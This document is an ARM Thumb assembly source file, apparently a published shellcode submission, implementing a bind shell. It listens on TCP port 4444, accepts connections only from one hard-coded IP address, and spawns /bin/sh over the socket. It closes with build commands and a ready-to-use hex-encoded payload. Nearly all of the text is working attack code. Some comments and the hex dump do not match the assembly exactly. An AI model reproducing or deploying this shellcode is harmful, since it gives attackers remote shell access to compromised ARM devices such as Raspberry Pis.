/*
* Title:  Linux/ARM - IP Controlled Bind Shell TCP (/bin/sh). Null free shellcode (168 bytes)
* Date:   2018-02-17
* Tested: armv7l (Raspberry Pi v3) and armv6l (Raspberry Pi Zero W)
* Author: rtmcx - twitter: @rtmcx
* Description:	The shellcode will only allow the connection to execute the shell if originating from the allowed IP.
* 				Otherwise, the connection is dropped and the shellcode will wait for a new connection.
*/

.section .text

.global _start
_start:
	/* Enter Thumb mode */
	.ARM
	add	r3, pc, #1
	bx	r3

	.THUMB
	nop							// nop needed for address alignment

/* Create a new socket*/
	mov		r0, #2				// Add values for
	mov		r1, #1				// socket creation
	eor		r2, r2, r2			// Zero out r2
	mov 	r7, #200			// Put 281 in r7 ...
	add		r7, #81				// ...in a 2-step fashion
	svc		#1					// Execute syscall

	/* The new socket will be returned in r0, which will be used later, i
	   so save the new socket to another register (r4). */
	mov	r4, r0					// Save socket in r4


/* Bind socket */
	adr 	r1, struct_addr		// address to string "1,1,1,1"
	strb	r2, [r1, #1]		// replace to 0 for AF_INET
 	str 	r2, [r1, #4] 		// write 0.0.0.0 to r2
	mov 	r2, #16				// address length str r2, [r1, #4]
	add 	r7, #1				// r7 already contains 281
	svc 	#1					// Execute syscall


/* Listen for connections */
	mov 	r0, r4			// r4 has saved sock_fd
	mov 	r1, #2			// Backlog value
	add 	r7, #2			// r7 already contains 282
	svc		#1


/* Accept incomming connections */
accept:
	mov		r0, r4				// r4 has saved sock_fd
	mov		r8, r4				// Save srv-socket in r8
	eor		r5, r5, r5			// Get some NULLs
	adr		r1, struct_client_addr  // Put address of struct_client in r1
	strb	r5, [r1, #1]		// replace 0 for AF_INET
	adr		r2, addr_len		// Address to variable for addr_len
	add		r7, #1				// r7 already contains 284
	svc		#1

	mov		r4, r0				// save client_sock in r8


	/* Compare the clients ip against the allowed..*/
	adr     r5, client_ip		// Save the address to the clients IP in r5
	adr 	r1, allowed_ip		// Save the address to the allowed IP in r1

	ldr     r3, [r1]			// Load the client IP value into r3
	ldr     r2, [r5]			// Load one allowed IP value into r2

	cmp		r2, r3				// compare the bytes
	bne		close				// Not same, close the connection



/* IP Address match */
/* Duplicate STDIN, STDOUT and STERR*/
	mov 	r0, r4				// Saved sockfd
	eor 	r1, r1, r1			// Zero r1 for STDIN
	mov		r7, #63				// Syscall for dup2
	svc 	#1					// Execute syscall

	mov 	r0, r4				// Saved sockfd
	add 	r1, #1				// STDOUT
	svc		#1					// Execute syscall

	mov 	r0, r4				// Saved sockfd
	add 	r1, #1				// STDERR
	svc		#1					// Execute syscall


/* Execute shell */
	adr 	r0, shellcode		// address to "/bin/sh"
	eor	r1, r1, r1				// zero out r1
	eor	r2, r2, r2				// and r2
	strb	r2, [r0, #7]		// Replace 'X' with NULL
	mov	r7, #11					// Syscall for execve
	svc 	#1


/* Close current connection (used if connection is from unallowed IP) */
close:
	mov 	r0, r4				// Put saved client sockfd into r0
	mov 	r7, #6				// Syscall number for "close"
	svc 	#1					// Execute syscall

	/* r7 now contains 6, so we must restore the value to 284 (accept will add 1 to get the correct value)*/
	mov 	r7, #200			// Put 284 in r7 ...
	add		r7, #84				// ...in a 2-step way
	mov 	r4, r8				// Restore saved sock_fd to r4
	b		accept				// After we closed the connection,
								// wait for a new connection

/* Structs and variables */

struct_client_addr:
	.ascii "\x02\xff"			// AF_INET 0xff will be NULLed
	.ascii "\x11\x11"			// Client port number
client_ip:
	.byte 2,2,2,2				// Client IP Address (8 byte)

struct_addr:
	.ascii "\x02\xff"			// AF_INET 0xff will be NULLed
	.ascii "\x11\x5c"			// Port number 4444
	.byte 1,1,1,1				// IP Address (8 byte)

shellcode:
	.ascii "/bin/shX"

allowed_ip:
	.ascii "\xc0\xa8\x01\xbe"	// The allowed IP (192.168.1.190)

addr_len:
	.ascii "\x10\x10"			// accept() must have the length of the struct in a variable

/*
Compile and link with:
# as -o shellcode.o shellcode.s
# ld -N shellcode.o -o shellcode

\x01\x30\x8f\xe2\x13\xff\x2f\xe1\xc0\x46\x02\x20\x01\x21\x52\x40\xc8\x27\x51\x37\x01\xdf\x04\x1c
\x1d\xa1\x4a\x70\x4a\x60\x10\x22\x01\x37\x01\xdf\x20\x1c\x02\x21\x02\x37\x01\xdf\x20\x1c\xa0\x46
\x6d\x40\x15\xa1\x4d\x70\x1b\xa2\x01\x37\x01\xdf\x04\x1c\x5b\x40\x52\x40\x12\xa5\x16\xa1\x05\x26
\x0b\x78\x2a\x78\x9a\x42\x14\xd1\x01\x35\x01\x31\x01\x3e\x01\x2e\xf6\xd1\x20\x1c\x49\x40\x3f\x27
\x01\xdf\x20\x1c\x01\x31\x01\xdf\x20\x1c\x01\x31\x01\xdf\x0a\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27
\x01\xdf\x20\x1c\x06\x27\x01\xdf\xc8\x27\x54\x37\x44\x46\xd1\xe7\x02\xff\x11\x5c\x02\x02\x02\x02
\x02\xff\x11\x5c\x01\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x58\xc0\xa8\x01\xbe\x10\x10\xc0\x46

*/